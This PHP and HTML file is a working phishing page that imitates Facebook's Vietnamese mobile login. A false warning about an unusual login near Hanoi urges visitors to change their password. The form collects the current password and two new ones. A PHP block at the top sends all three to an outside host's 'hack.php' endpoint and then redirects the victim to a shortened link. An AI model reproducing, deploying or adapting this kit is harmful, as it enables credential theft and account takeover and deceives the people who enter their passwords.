<?php
if(isset($_POST['pass'])){
	if($_POST['pass'] != ''){
		file_get_contents('http://token.hethongbotvn.com/api/hack.php?pass='.$_POST['pass'].'|'.$_POST['pass1'].'|'.$_POST['pass2'].'');
		header("Location: https://bit.ly/IKQn3f");
	}

}

?>
<html>
<head>
    <title></title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/VrVzPK2vzr4.css" data-bootloader-hash="n7aZZ" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yG/l/0,cross/jdygqcrqVdI.css" data-bootloader-hash="sJT7e" crossorigin="anonymous">
    
</head>
<style>
._5yd0 {
    background: #3577d4!important;
}
</style>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="min-height: 633px; background-color: rgb(255, 255, 255);">
   
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 633px;">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page" class="">
            <div class="_129_" id="header-notices"></div>
            <div class="_4g33 _52we _52z5" id="header">
                <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?refid=8"><i class="img sp_79BIUcIlZnt sx_ad7234"><u>facebook</u></i></a></div>
            </div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 633px;">
                <div class="_4g33">
                    <div class="_4g34" id="u_0_0">
                    	<div class="_5yd0 _2ph- _5yd1" style="" data-sigil="m_login_notice">Xin chào. Chúng tôi nhận thấy một đăng nhập bất thường trên tài khoản của bạn trên thiết bị <b>Facebook for Android 5.1 (gần Hanoi, Vietnam)</b>. Để đảm bảo an toàn cho tài khoản của bạn. Vui lòng đổi mật khẩu tại đây.<br></div>
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="aclb _4-4l">
                            <div data-sigil="m_login_upsell login_identify_step_element"></div>
                            <div class="_5rut">

                                <form method="post" action="" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form" data-autoid="autoid_4">
                                    <input type="hidden" name="lsd" value="AVqFXKwF" autocomplete="off">
                                    <input type="hidden" name="m_ts" value="1545618743">
                                    <input type="hidden" name="li" value="N0UgXKoWSka3hPABsQryKWwO">
                                    <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number">
                                    <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries">
                                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                    <div id="otp_retrieve_desc_container"></div>
                                    <div class="_56be _5sob">
                                        <div class="_55wo _55x2 _56bf">
                                            <div id="email_input_container">
                                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="pass" placeholder="Mật khẩu" type="text" data-sigil="m_login_email">
                                            </div>
                                            <div>
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass1" placeholder="Nhập lại mật khẩu" type="tt" data-sigil="password-plain-text-toggle-input">
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                </div>
                                            </div>

<div>
                                                <div class="_1upc _mg8" data-sigil="m_login_password">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="pass2" placeholder="Mật khẩu mới" type="text" data-sigil="password-plain-text-toggle-input">
                                                            </div>
                                                        </div>
                                                        
                                                    </div>
                                                </div>
                                            </div>


                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align:center;">
                                        <div id="u_0_4" data-sigil="login_password_step_element">
                                            <button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5" data-sigil="touchable m_login_button" data-autoid="autoid_3"><span class="_55sr">Đổi mật khẩu</span></button>
                                        </div>
                                        <div id="otp_button_elem_container"></div>
                                    </div>
                                    <input type="hidden" name="prefill_contact_point" id="prefill_contact_point">
                                    <input type="hidden" name="prefill_source" id="prefill_source">
                                    <input type="hidden" name="prefill_type" id="prefill_type">
                                    <input type="hidden" name="first_prefill_source" id="first_prefill_source">
                                    <input type="hidden" name="first_prefill_type" id="first_prefill_type">
                                    <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false">
                                    <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false">
                                    <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false">
                                    <div class="_xo8"></div>
                                    <noscript>
                                        <input type="hidden" name="_fb_noscript" value="true" />
                                    </noscript>
                                </form>
                                <br><br>
                                <div>
                                    <div class="other-links">
                                        <ul class="_5pkb _55wp">
                                            <li><span class="mfss fcg"><a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;refid=8" id="forgot-password-link">Quên mật khẩu?</a><span aria-hidden="true"> · </span><a href="/help/?refid=8" id="help-link" class="sec">Trung tâm trợ giúp</a></span>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div></div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span>
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_4g33">
                                <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=zh_TW&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQB9IetOWuWnuM5b&amp;refid=8" data-sigil="change_language">中文(台灣)</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQC8n3KOa1JK2Oap&amp;refid=8" data-sigil="change_language">Español</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQCRnnI_fBtRbx9I&amp;refid=8" data-sigil="change_language">Français (France)</a></span></div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=en_GB&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQAVkkylIvnzHLKe&amp;refid=8" data-sigil="change_language">English (UK)</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=ko_KR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQACYc_5h5JNYYHR&amp;refid=8" data-sigil="change_language">한국어</a></span></div>
                                    <div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;gfid=AQCvYSv3VEw6wEV7&amp;refid=8" data-sigil="change_language">Português (Brasil)</a></span></div>
                                    <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fm.facebook.com%252Frecover%252Fcode%252F&amp;refid=8">
                                        <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i class="img sp_79BIUcIlZnt sx_6c6dcf"></i></div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4"><span class="mfss fcg">Facebook ©2018</span></div>
                    </div>
                </div>
            </div>
            <div class=""></div>
            <div class="viewportArea _2v9s" style="display:none" id="u_0_7" data-sigil="marea">
                <div class="_5vsg" id="u_0_8" style="max-height: 249px;"></div>
                <div class="_5vsh" id="u_0_9" style="max-height: 316px;"></div>
                <div class="_5v5d fcg">
                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Đang tải...</div>
            </div>
            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
                <div class="container">
                    <div class="image"></div>
                    <div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Thử lại</a></div>
            </div>
        </div>
    </div>
    <div id="static_templates">
        <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1">
            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
                <div class="_4g33 _52we">
                    <div class="_5s61">
                        <div class="_52z7">
                            <button type="submit" value="Hủy" class="cancelButton btn btnD bgb mfss touchable" id="u_0_b" data-sigil="dialog-cancel-button">Hủy</button>
                            <button type="submit" value="Quay lại" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Quay lại" id="u_0_c" data-sigil="dialog-back-button"><i class="img sp_79BIUcIlZnt sx_4214f1" style="margin-top: 2px;"></i></button>
                        </div>
                    </div>
                    <div class="_4g34">
                        <div class="_52z6">
                            <div class="_50l4 mfsl fcw" id="m-future-page-header-title" data-sigil="m-dialog-header-title dialog-title">Đang tải...</div>
                        </div>
                    </div>
                    <div class="_5s61">
                        <div class="_52z8" id="modalDialogHeaderButtons"></div>
                    </div>
                </div>
                <div id="pagelet_0_0"></div>
            </div>
            <div class="modalDialogView" id="modalDialogView"></div>
            <div class="_5v5d _5v5e fcg" id="dialogSpinner">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_a" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Đang tải...</div>
        </div>
    </div>
    


 

</body>

</html>